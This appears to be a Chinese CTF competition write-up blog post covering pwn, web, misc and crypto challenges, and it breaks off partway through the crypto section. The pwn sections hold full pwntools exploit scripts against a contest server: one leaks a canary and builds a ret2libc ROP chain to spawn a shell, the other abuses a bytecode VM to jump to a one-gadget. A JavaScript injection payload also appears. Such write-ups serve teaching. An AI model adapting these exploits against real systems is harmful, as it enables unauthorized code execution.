<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            网谷杯 |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                  || fa-solid fa-tags","categories":"/categories      || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":null,"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"],"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                TAGS
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                
                                CATEGORIES
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            TAGS
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                </span>
                            
                            CATEGORIES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        网谷杯
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-09-14</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Sun Sep 14 2025 14:21:21 GMT+0800">2025-09-14</span>
                </span>
            
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/WP/">WP</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/WP/">WP</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="金丝雀-wgb"><a href="#金丝雀-wgb" class="headerlink" title="金丝雀-wgb"></a><strong>金丝雀-wgb</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/zach0ry-zzh/zach0ry-zzh.github.io/raw/refs/heads/main/attach/%E9%87%91%E4%B8%9D%E9%9B%80-wgb.zip" >附件<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913175247353.png"  alt="image-20250913175247353"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913175322389.png"  alt="image-20250913175322389"></p>
<p>分析看到main中的buf可以绕过canary，而gift是很明显的栈溢出</p>
<p>用read函数去泄露，把canary的值放到bss段，写出来</p>
<p>之后用retlibc去泄露就好，（把canary放在合适的位置上面）</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250914111727814.png"  alt="image-20250914111727814"></p>
<p>可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p= process(&quot;./111&quot;)</span><br><span class="line">p=remote(&quot;119.36.240.225&quot;,48793)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&quot;./111&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x4013e3</span><br><span class="line">ret = 0x40101a</span><br><span class="line">gift = 0x40123D</span><br><span class="line">bss = 0x404f00</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea=0x401296</span><br><span class="line">payload = p64(bss) + p64(lea)</span><br><span class="line">p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lea=0x4012EA</span><br><span class="line">payload = p64(bss - 0x8 + 0x50) + p64(lea)</span><br><span class="line">p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;2&#x27;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline().strip()</span><br><span class="line">canary = u64(p.recv(8) , 16)</span><br><span class="line">print(&quot;=====&quot; , canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;Do you want to enter other functions?&#x27;, &#x27;1&#x27;)</span><br><span class="line">payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)</span><br><span class="line">payload+=p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(gift)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - 0x84420 </span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * 0x38 + p64(canary) + p64(0)</span><br><span class="line">payload+= p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>flag{9fa258d4-dfef-414d-80f9-9e315889462f}</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913180640243.png"  alt="image-20250913180640243"></p>
<p>注意，这里要抬栈，不然函数会在scanf卡住[0x403b08]</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250914121426485.png"  alt="image-20250914121426485"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250914122237319.png"  alt="image-20250914122237319"></p>
<p>这里卡在了mov操作，要写入的w权限</p>
<h2 id="zeroday-wgb"><a href="#zeroday-wgb" class="headerlink" title="zeroday-wgb"></a><strong>zeroday-wgb</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/zach0ry-zzh/zach0ry-zzh.github.io/raw/refs/heads/main/attach/ZeroDay.zip" >附件<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913184326574.png"  alt="image-20250913184326574"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913184342294.png"  alt="image-20250913184342294"></p>
<p>分析，6可以输出地址，用它来泄露libc基地址，7可以直接运行+144的位置，但是buf最多输入0x400,所以要对buf_0输入，也就是用1进行，在+144位置上放上后门函数就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">p = remote(&quot;119.36.240.225&quot;, 43376)</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line">def push_q(x): return b&#x27;\x01&#x27; + p64(x)</span><br><span class="line">def op_pop():  return b&#x27;\x02&#x27;</span><br><span class="line">def op_add():  return b&#x27;\x03&#x27;</span><br><span class="line">def op_xor():  return b&#x27;\x04&#x27;</span><br><span class="line">def op_print():return b&#x27;\x05&#x27;</span><br><span class="line">def op_call(): return b&#x27;\x06&#x27;</span><br><span class="line">def leak(addr):return b&#x27;\x07&#x27; + p64(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[&quot;puts&quot;]</span><br><span class="line">payload_leak = leak(puts_got)</span><br><span class="line">sa(b&quot;Enter bytecode:&quot;, payload_leak)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;LEAK: &quot;)</span><br><span class="line">leak_line = p.recvline()</span><br><span class="line">parts = leak_line.split(b&#x27; &#x27;)</span><br><span class="line">puts_real_addr_str = parts[2]</span><br><span class="line">puts_real_addr = int(puts_real_addr_str, 16)</span><br><span class="line">log.info(f&quot;Puts real address: &#123;hex(puts_real_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = puts_real_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">log.info(f&quot;Libc base address: &#123;hex(libc_base)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">off = 0xe3afe</span><br><span class="line">target = libc_base + off</span><br><span class="line"></span><br><span class="line">payload = b&#x27;&#x27;</span><br><span class="line">payload += push_q(0) * 16</span><br><span class="line">payload += push_q(target)</span><br><span class="line">payload += op_call()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sa(b&quot;Enter bytecode:&quot;, b&quot;ls -al&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>flag{840fde71-2c8a-4d4f-a716-1232fdf72054}</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250913184633127.png"  alt="image-20250913184633127"></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="真假之间-wgb"><a href="#真假之间-wgb" class="headerlink" title="真假之间-wgb"></a><strong>真假之间-wgb</strong></h2><p><img   src="C:/Users/Administrator/Desktop/111/image-20250913190920293.png"  alt="image-20250913190920293"></p>
<p><img   src="C:/Users/Administrator/Desktop/111/b1772a3958ff900390a36608bf64c737.png"  alt="b1772a3958ff900390a36608bf64c737"></p>
<p>payload:a&#x3D;7e6&amp;b&#x3D;axht&amp;c&#x3D;function%20setItem%28k%2Cv%29%7BsessionStorage.setItem%28k%2CJSON.stringify%28v%29%29%3B%7D%20setItem%28%272025x%27%2C%20%5B%22a%22%2C%209999999999999999%5D%29%3B</p>
<p><img   src="C:/Users/Administrator/Desktop/111/540bdf7f643ec7f96589de3d4a1415d7.png"  alt="540bdf7f643ec7f96589de3d4a1415d7"></p>
<p>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 输出当前页面的 Cookie</span><br><span class="line">console.log(&#x27;cookie=&#x27;, document.cookie);</span><br><span class="line"></span><br><span class="line">// 输出 sessionStorage 中键为 &#x27;2025x&#x27; 的值</span><br><span class="line">console.log(&#x27;sessionStorage[2025x]=&#x27;, sessionStorage.getItem(&#x27;2025x&#x27;));</span><br><span class="line"></span><br><span class="line">// 输出 ID 为 &#x27;flag_base85&#x27; 的元素的文本内容，如果不存在则输出 &#x27;&lt;empty&gt;&#x27;</span><br><span class="line">console.log(&#x27;#flag_base85=&#x27;, document.getElementById(&#x27;flag_base85&#x27;) ? document.getElementById(&#x27;flag_base85&#x27;).textContent : &#x27;&lt;empty&gt;&#x27;);</span><br></pre></td></tr></table></figure>

<p><img   src="C:/Users/Administrator/Desktop/111/cf9ef2b26206e614899ac20fd2c98a46.png"  alt="cf9ef2b26206e614899ac20fd2c98a46"></p>
<p>flag{D9xT7ePqA1LuVnYk}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Format-8bit-wgb"><a href="#Format-8bit-wgb" class="headerlink" title="Format-8bit-wgb"></a><strong>Format-8bit-wgb</strong></h2><p>随波逐流提取</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913185713891.png"  alt="image-20250913185713891"></p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913185811897.png"  alt="image-20250913185811897"></p>
<p>转一下</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913185916569.png"  alt="image-20250913185916569"></p>
<p>flag{2815dc1e28f9d89e2b80072d23c4dc35}</p>
<h2 id="non-interlaced-wgb"><a href="#non-interlaced-wgb" class="headerlink" title="non-interlaced-wgb"></a><strong>non-interlaced-wgb</strong></h2><p><img   src="C:/Users/Administrator/Desktop/111/089d474e60e9af59b525550738358eb0.png"  alt="089d474e60e9af59b525550738358eb0"></p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913195002116.png"  alt="image-20250913195002116"></p>
<p>脚本</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913200341297.png"  alt="image-20250913200341297"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import binascii # 导入 binascii 库，用于处理二进制和 ASCII 之间的转换（尽管在此脚本中未直接使用）</span><br><span class="line">import io</span><br><span class="line">import zipfile # 导入 zipfile 库，用于处理 ZIP 压缩文件</span><br><span class="line">import os # 导入 os 库，用于与操作系统交互（例如文件路径）</span><br><span class="line">from PIL import Image # 导入 Pillow 库的 Image 模块，用于处理图像</span><br><span class="line"></span><br><span class="line"># 定义一个函数，用于将图像的 RGB 通道数据按顺序提取为字节串</span><br><span class="line">def img_to_bytes_rgb_order(path):</span><br><span class="line">    # 使用 Pillow 库打开图像文件，并将其转换为 RGB 模式</span><br><span class="line">    arr = np.array(Image.open(path).convert(&quot;RGB&quot;))</span><br><span class="line">    # 将图像的 RGB 平面按顺序拼接：首先是所有 R 通道数据，然后是所有 G 通道数据，最后是所有 B 通道数据</span><br><span class="line">    # .flatten() 将二维数组展平为一维</span><br><span class="line">    # .tolist() 将 NumPy 数组转换为 Python 列表</span><br><span class="line">    # bytes(...) 将列表转换为字节串</span><br><span class="line">    return bytes(arr[:,:,0].flatten().tolist() + arr[:,:,1].flatten().tolist() + arr[:,:,2].flatten().tolist())</span><br><span class="line"></span><br><span class="line"># 通过列表推导式，依次处理三张图像，并将它们的字节串连接起来</span><br><span class="line"># 假设这三张图像的文件路径是 &quot;/mnt/data/c1.png&quot;, &quot;/mnt/data/c2.png&quot;, &quot;/mnt/data/c3.png&quot;</span><br><span class="line"># 最终将所有图像的字节数据拼接成一个完整的字节串</span><br><span class="line">data = b&#x27;&#x27;.join(img_to_bytes_rgb_order(p) for p in [&quot;/mnt/data/c1.png&quot;,&quot;/mnt/data/c2.png&quot;,&quot;/mnt/data/c3.png&quot;])</span><br><span class="line"></span><br><span class="line"># 指定恢复后的 ZIP 文件的路径</span><br><span class="line">zip_path = &quot;/mnt/data/recovered_from_9_images.zip&quot;</span><br><span class="line"># 以二进制写入模式打开文件，将拼接好的字节数据写入其中</span><br><span class="line">with open(zip_path, &quot;wb&quot;) as f:</span><br><span class="line">    f.write(data)</span><br><span class="line"></span><br><span class="line"># 尝试读取新创建的 ZIP 文件，并列出其内部的文件名</span><br><span class="line">listing = []</span><br><span class="line">try:</span><br><span class="line">    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zf:</span><br><span class="line">        # zf.namelist() 获取 ZIP 文件中所有文件和文件夹的名称列表</span><br><span class="line">        listing = zf.namelist()</span><br><span class="line">except Exception as e:</span><br><span class="line">    # 如果在读取 ZIP 文件时发生任何错误（例如文件损坏），则捕获异常并记录错误信息</span><br><span class="line">    listing = [f&quot;读取ZIP时出现问题: &#123;e!r&#125;&quot;]</span><br><span class="line"></span><br><span class="line"># 打印最终的文件列表或错误信息，以便用户查看结果</span><br><span class="line">print(listing)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913200701922.png"  alt="image-20250913200701922"></p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913200737301.png"  alt="image-20250913200737301"></p>
<p>flag{1c2121cab407dd44a5540d530ab9c6aa}</p>
<h1 id="CRY"><a href="#CRY" class="headerlink" title="CRY"></a>CRY</h1><h2 id="证书修复-wgb"><a href="#证书修复-wgb" class="headerlink" title="证书修复-wgb"></a><strong>证书修复-wgb</strong></h2><p>三个与 RSA，flag1直接解</p>
<p>flag23是dp泄露，泄露参数 dp、公钥指数 e 和模数 n，计算出模数 n 的一个素因数 p去重构私钥 d，从而解密密文</p>
<p><img   src="C:/Users/Administrator/Desktop/111/image-20250913191724100.png"  alt="image-20250913191724100"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span 